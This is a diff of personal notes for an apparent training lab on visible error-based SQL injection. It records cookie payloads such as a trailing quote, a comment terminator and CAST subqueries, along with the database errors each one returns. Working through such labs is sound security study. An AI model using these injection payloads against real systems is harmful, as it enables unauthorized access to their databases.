@@ -284,7 +284,10 @@ Lab13: Visible error-based SQL injection
    -FIND THE VULNERABLE PARAMETERS
       Cookie: TrackingId=XDtdqzHxWpaoVHWY'
       Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'XDtdqzHxWpaoVHWY''. Expected  char
+ 
+      TrackingId=ogAZZfxtOKUELbuJ'-- : No ERROR
 
-      TrackingId=ogAZZfxtOKUELbuJ'--
 
-      
+      TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)-- : error saying that an AND condition must be a boolean expression.
+
+      TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)-- : Confirm that you no longer receive an error. This suggests that this is a valid query again. 
